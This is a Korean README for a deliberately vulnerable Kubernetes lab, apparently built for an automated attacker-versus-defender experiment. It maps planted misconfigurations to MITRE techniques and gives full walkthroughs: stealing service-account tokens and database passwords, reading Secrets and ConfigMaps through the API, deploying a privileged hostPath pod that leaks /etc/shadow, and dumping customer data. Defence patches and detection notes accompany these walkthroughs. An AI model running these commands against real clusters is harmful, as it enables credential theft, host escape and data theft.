# k8s/killchain — 메인 킬체인 (환경 구축 3단계)

깨끗한 ShopFlow 스택에 취약점을 **"흔한 운영 실수"처럼** 심어, 공격자가 정찰로 약한 고리를
찾아내야 뚫리게 만든다. **이게 심긴 스택이 실험의 취약 베이스라인**(리셋 대상)이다.

## 킬체인 (①→④)

| 단계 | 취약점 | 심은 위치 | MITRE |
|------|--------|-----------|-------|
| **① 초기침투** | 런북이 DB 비번 대신 "admin 콘솔 운영 엔드포인트로 조회" 안내 → 정찰 단서 | `internal-wiki` 런북 (`services/internal/42-internal-wiki.yaml`) | T1552.001 |
| **② 권한상승** | `admin-dashboard` 과권한 SA + 내부 엔드포인트가 전 NS Secret 조회(DB 비번 획득) | `killchain/10-admin-overperm-rbac.yaml` + `42...`의 `/internal/secret` | T1078 |
| **③ 측면이동** | NetworkPolicy 부재 → 어느 파드든 `database` 직접 도달 | (부재가 곧 취약점, k3s는 NP 강제 가능) | T1210 |
| **④ 목표탈취** | 고객데이터 + FLAG | `postgres` `internal_secrets` 테이블 | T1213 |

**사슬 구조(①→②→③→④)**: DB 비번이 더 이상 위키에 평문으로 없다 → ①(런북 단서)로 admin 콘솔을
찾고 **②(과권한 SA)로 Secret 을 읽어야** 비번을 얻는다 → ③(NP 부재)로 database 도달 → ④ FLAG.
②가 비번 획득의 **필수 관문**이라, 방어자는 **②(restrict_rbac) 또는 ③(add_networkpolicy)** 어느
쪽을 막아도 공격을 끊을 수 있다(독립적으로 유효한 두 방어 선택지 = 공진화 전략성).
> 설계 메모: 자동 공격자는 admin-dashboard 에 `exec` 할 수 없으므로, 수동 walkthrough 의 "파드 내부
> 토큰 사용"을 **`/internal/secret/<ns>/<name>` 엔드포인트(confused deputy)**로 노출해 닿게 했다.
> 엔드포인트는 마운트된 과권한 SA 로 조회 → `restrict_rbac` 로 바인딩 삭제되면 403.

## 구성
```
killchain/
├─ 10-admin-overperm-rbac.yaml       # ② 과권한 SA (+[Wave1] pods:create·admin-sa classic 토큰; 베이스라인 적용)
├─ 20-plaintext-configmap-creds.yaml # [Wave1] 평문 크레덴셜 ConfigMap (다경로; 베이스라인 적용)
├─ attack-reference/                 # [Wave1] 공격자가 런타임에 '만드는' 산출물 레퍼런스 (베이스라인 미적용)
│   └─ escape-pod.yaml               #   T1610/T1611: privileged+hostPath 탈출 파드
└─ defense-reference/                # 방어자가 적용할 패치 예시 (베이스라인 미적용)
    ├─ networkpolicy-database.yaml   #   ③ 차단: database 인그레스 제한
    └─ rbac-reduced.yaml             #   ② 완화: 최소 권한 Role로 교체
```
①(wiki 유출)과 ② 연결(admin 파드의 `serviceAccountName`)은 `services/internal/` 매니페스트에
직접 반영되어 있다(주석 `3단계` 표시).

## 수동 공격 walkthrough (사람이 끝까지 뚫어보기)

> 자동 루프 붙이기 전에 사람이 직접 성공해봐야 한다. 실제 루프에선 VM C가 발판을 주지만,
> 여기선 공격자 파드를 띄워 "웹 계층 침해"를 모사한다. (netshoot pull에 인터넷 필요)
>
> ※ 자동 루프의 발판 구현: `00-attacker-foothold.yaml` + `foothold/README.md` 참고. frontend ns
> 에 상주 발판 파드를 두고 공격 하네스가 `kubectl exec`(frontend exec 전용 kubeconfig)로 그 안에서
> 명령을 돌린다(config `attack.exec_mode=true`). ①③④ 가 `.svc.cluster.local` 내부 주소라 공격자가
> 클러스터 '안'에 있어야 하기 때문 — 이 수동 walkthrough 의 공격자 파드를 자동화한 것.

**발판 — frontend 계층에 공격자 셸:**
```bash
kubectl -n frontend run attacker --rm -it --image=nicolaka/netshoot --restart=Never -- bash
```

**①→② 크레덴셜 획득 — 런북 단서 → admin 콘솔 과권한 엔드포인트로 DB Secret 조회:**
```bash
# ① 런북엔 비번이 없고 admin 콘솔 엔드포인트 안내만:
curl -s http://internal-wiki.internal.svc.cluster.local/runbook.html | grep -A1 internal/secret
# ② 그 엔드포인트가 마운트된 과권한 SA 로 database Secret 을 읽어준다(confused deputy):
curl -s http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/database/postgres-credentials \
  | grep -o '"POSTGRES_PASSWORD":"[^"]*"'
# → "POSTGRES_PASSWORD":"ZGV2cGFzc3dvcmQxMjM="   →  base64 -d  →  devpassword123
```

**③ 측면이동 — NP 부재로 발판(frontend)에서 database 직접 도달 확인:**
```bash
nc -zv postgres.database.svc.cluster.local 5432     # → open (차단 없음)
```

**④ 목표탈취 — DB 접속해 FLAG 획득** (attacker 셸 나와서, psql 있는 파드로):
```bash
kubectl -n frontend run dbattack --rm -it --image=postgres:16-alpine --restart=Never -- \
  psql "postgresql://appuser:devpassword123@postgres.database.svc.cluster.local:5432/customerdb" \
  -c "SELECT key, value FROM internal_secrets;"
# → FLAG{...}  +  고객 PII도 SELECT * FROM customers 로 탈취 가능
```

**② 권한상승 (독립 경로) — admin-dashboard 침해 시 과권한 SA로 Secret 직접 탈취:**
```bash
# 과권한 확인:
kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:internal:admin-sa   # → yes
# 침해된 admin 파드에서 토큰으로 DB 크레덴셜 Secret 직접 조회 (①없이도 획득):
kubectl -n internal exec deploy/admin-dashboard -- sh -c \
  'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
   https://kubernetes.default.svc/api/v1/namespaces/database/secrets/postgres-credentials' | grep -o "POSTGRES_PASSWORD[^\"]*"
```

## 방어 검증 (방어자 패치가 실제로 막는지)
```bash
# ③ 차단:
kubectl apply -f k8s/killchain/defense-reference/networkpolicy-database.yaml
#   → frontend 발판에서 nc/psql 재시도 시 타임아웃(차단). 쇼핑몰(web→backend→db)은 정상.
# ② 완화:
kubectl delete clusterrolebinding admin-tools-binding && kubectl delete clusterrole admin-tools
kubectl apply -f k8s/killchain/defense-reference/rbac-reduced.yaml
#   → auth can-i list secrets --all-namespaces ... → no
# ① 차단: 위키 런북에서 크레덴셜 제거 + DB 비밀번호 로테이션
```

## [Wave1] 확장 취약점 (MITRE 매핑)

메인 체인 ①~④에 **②에서 갈라지는 두 분기**와 **다경로 크레덴셜**을 더했다. 목적: 방어자가
단일 급소 하나만 막고 끝나지 못하게 공격면을 넓히고, '차단 가능' 위협과 '탐지만 가능한' 위협
(Discovery)을 구분해 **탐지 커버리지 ≠ 차단 효과**라는 주제를 더 또렷하게 만든다.

| 기법 | 이름 | 심은 위치 | god-view 신호 | 방어 |
|------|------|-----------|---------------|------|
| **T1610** | Deploy Container | `admin-tools` ClusterRole 에 `pods: create` + `admin-sa-token` Secret (`10-...rbac.yaml`) | 감사 `admin-sa create pods` | `restrict_rbac`(바인딩 삭제→create 403) |
| **T1611** | Escape to Host | k3s 기본 PodSecurity 미강제 → privileged/hostPath 파드 허용 (공격자가 `attack-reference/escape-pod.yaml` 류를 배포) | Falco `Escape to host filesystem`(/host 민감파일 read) | `restrict_pod_security`(ns enforce=baseline) + `delete_pod` |
| **T1005** | Data from Local System | **호스트 objective(크라운 주얼)** — 노드 파일 `/etc/shopflow/host.flag`(600) 를 탈출로 읽어 획득 (`generate-flags.sh` 가 심음) | 값 대조(`match_value`) — ④와 별개 축 | (탈출 자체를 T1610/T1611 방어로 차단) |
| **T1552.001** | Unsecured Credentials (ConfigMap) | `backend/legacy-db-config` 평문 DB 접속문자열 (`20-...configmap-creds.yaml`) | 감사 `admin-sa get/list configmaps` | `restrict_rbac`(configmap 조회 권한도 같은 바인딩) |
| **T1046** | Network Service Discovery | (발판 도구로 포트 스캔) | Falco `Port scan from foothold`(nc/nmap) | *detect-only* |
| **T1613** | Container & Resource Discovery | (탈취 토큰으로 열거) | 감사 `admin-sa list namespaces` | *detect-only* |
| **T1069** | Permission Groups Discovery | (auth can-i) | 감사 공격자 SA `create selfsubject*reviews` | *detect-only* |

> **채점 반영 방식**: 신규 기법은 `orchestrator/log_source.py` 매핑만으로 `sequencer._build_truth`
> 가 자동으로 truth 에 넣어 탐지(TP/FP/FN) 채점한다. 도달 깊이(①~④)는 digit flag_id 만 세므로
> 확장 기법(비-digit id in `flags.py`)이 선형 깊이를 흐리지 않는다. 다경로 크레덴셜은 같은
> T1552.001 이라 기존 flag "1" 을 보강(별도 flag 안 둠).

### 컨테이너 탈출 체인 walkthrough (② → T1610 → T1611)

자동 공격자는 발판 busybox `wget` + 탈취한 admin-sa Bearer 토큰만으로 아래를 수행한다(발판에
exec 스트리밍이 없어도 파드 로그 API 로 결과를 회수). 수동 검증:
```bash
# (전제) 발판 셸에서 — ② 로 admin-sa classic 토큰 '그 자체'를 confused-deputy 로 탈취:
TOK=$(wget -qO- http://admin-dashboard.internal.svc.cluster.local:8080/internal/secret/internal/admin-sa-token \
  | sed 's/.*"token":"\([^"]*\)".*/\1/' | base64 -d)
# (T1069) 권한 열거 — 내가 pods create 할 수 있나:
wget -qO- --header="Authorization: Bearer $TOK" --header="Content-Type: application/json" \
  --post-data='{"spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}' \
  --no-check-certificate https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews
# (T1613) 네임스페이스 열거:
wget -qO- --header="Authorization: Bearer $TOK" --no-check-certificate https://kubernetes.default.svc/api/v1/namespaces
# (T1610) privileged+hostPath 파드 배포 (attack-reference/escape-pod.yaml 를 JSON/YAML 로 POST):
wget -qO- --header="Authorization: Bearer $TOK" --header="Content-Type: application/yaml" \
  --post-data="$(cat escape-pod.yaml)" --no-check-certificate \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods
# (T1611) 탈출 결과 회수 — 파드가 /host/etc/shadow 를 읽어 로그로 흘린다:
wget -qO- --header="Authorization: Bearer $TOK" --no-check-certificate \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods/pwn-escape/log
```
**호스트 objective(T1005)**: 탈출 파드 command 가 `/host/etc/shopflow/host.flag` 를 먼저 읽어
로그로 흘리므로, 위 (5) 파드 로그 회수에 **호스트 FLAG 값**이 담긴다 → 공격자가 보고 → god-view
가 값대조(`match_value`)로 'host' objective 달성 판정(④ DB FLAG 와 별개 축). 설치: `generate-flags.sh`.

**방어 검증**: 방어자가 `restrict_rbac`(admin-tools-binding 삭제)면 토큰이 pods create 403 →
T1610 차단. `restrict_pod_security default`(enforce=baseline)면 privileged 파드가 admission
거부 → T1611 차단(→ 호스트 FLAG 도 못 읽음). 정상 ShopFlow 파드는 baseline 적합이라 가용성 영향 없음.

### 다경로 크레덴셜 walkthrough (T1552.001 ConfigMap)
```bash
# ② 로 토큰 탈취 후, Secret 이 아닌 '평문 ConfigMap' 에서 같은 DB 비번 획득(두 번째 경로):
wget -qO- --header="Authorization: Bearer $TOK" --no-check-certificate \
  https://kubernetes.default.svc/api/v1/namespaces/backend/configmaps/legacy-db-config
# → data.DB_PASSWORD = devpassword123 (base64 아님, 평문). → ④ 로 직행 가능.
```
교훈: 과권한은 Secret 만의 문제가 아니다. 방어자는 Secret 잠금만으론 부족하고 `restrict_rbac`
(조회 권한 자체 축소)로 Secret·ConfigMap 두 경로를 함께 닫아야 한다.

### Discovery 는 왜 'detect-only' 인가
T1046/T1613/T1069 는 정찰이라 정상 조회와 구분이 어렵고 전용 차단 패치가 없다(억지 차단은
가용성만 해친다). 방어자는 **탐지해서 보고만** 하는 게 정답 — 이걸로 방어자의 '과잉 패치
억제(정밀도)'를 시험한다. 실질 위협 때문에 건 NetworkPolicy·RBAC 축소가 탐색도 부수적으로 줄인다.

## 리셋
완전 원복은 VMware 스냅샷 복원(5단계 자동화). 단, 운영 루프는 **A2 k8s-네이티브 리셋**
(`orchestrator/baseline.py`)을 쓴다 — 에피소드 경계마다: NetworkPolicy 전삭제 + [Wave1]
공격자 생성 파드 정리(default 전삭제 + `created-by=attacker` 라벨) + [Wave1] PodSecurity
enforce 라벨 제거 + killchain 매니페스트 재적용(과권한 바인딩·토큰·configmap 복구) + 발판 rollout.
수동으론 `teardown-services.sh` 후 재배포 + 방어 레퍼런스로 적용한 NP/RBAC/PSA 수동 삭제.
